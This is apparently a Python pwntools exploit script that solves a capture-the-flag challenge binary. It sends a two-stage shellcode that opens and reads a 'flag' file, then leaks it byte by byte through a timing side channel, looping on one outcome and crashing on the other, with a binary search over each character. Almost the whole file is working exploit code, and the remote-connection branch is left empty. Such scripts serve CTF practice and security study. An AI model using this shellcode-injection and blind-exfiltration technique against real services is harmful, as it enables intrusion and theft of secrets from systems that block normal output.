#!/usr/bin/env python3

from pwn import *

def pwn():
    # /proc/sys/vm/mmap_min_addr == 0x10000, so mmap(0x1000, ...) 
    # will return 0x10000
    shellcode_base_addr = 0x10000
    read_shellocde = shellcraft.read(0, shellcode_base_addr+0x20, 0x100)
    # 21 bytes
    log.info("shellcode of read is %d bytes." % len(asm(read_shellocde)))
    # after read() has completed, jmp to the second shellcode payload
    read_shellocde += "jmp $+11" # '$' means current ip, so '$+11' means jmp rip+11 == 0x20
    payload_read = asm(read_shellocde)
    log.info("Disassemble of read shellcode payload:\n%s" % disasm(payload_read))

    # sys_write is forbidden, we can use binary search to crack the flag.
    orw_shellcode = "open:" + shellcraft.open("flag")
    # read(3, $rsp, 0x100)
    orw_shellcode += '''
        /* read($rax, $rsp, 0x100) */
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax /* SYS_read == 0 */
        syscall
        /* compare each single bytes with a char from 0 to 127 */
        /* if it's lesser than the char, loop forever, else abort. */
        /* if (flag[i] > gueess) l = mid+1 else r = mid */
        loop:
        mov al, [rsi+%d] /* al = flag[i] */
        cmp al, %d      /* cmp al, guess */
        /* loop forever if the flag[i] > guess */
        ja loop 
        /* flag[i] <= guess, access a invalid memory to abort */
        mov [rax], rax
    '''

    flag = ""
    # assume the length of flag lesser than 0x30
    for i in range(0x30):
        l, r = 0, 128
        while (l < r):
            if (args.REMOTE):
                # connect to remote server
                pass
            else:
                g_io = process(g_fname)
            
            mid = (l+r) >> 1
            
            g_io.send(payload_read)

            payload_orw = asm(orw_shellcode % (i, mid))
            g_io.send(payload_orw)
            
            st = time.time()
            try:
                while True:
                    # loop until an exception occur or timeout
                    g_io.recv(timeout=0.05)
                    if (time.time() - st > 1):
                        l = mid + 1
                        break
            except EOFError:
                r = mid
            g_io.close()
        flag += chr(l)
        print(flag)

if "__main__" == __name__:
    if (args.DEBUG):
        context.log_level = "debug"
    
    g_fname = args.FNAME if (args.FNAME) else "./chall"
    g_elf = ELF(g_fname)
    context.binary = g_elf
    pwn()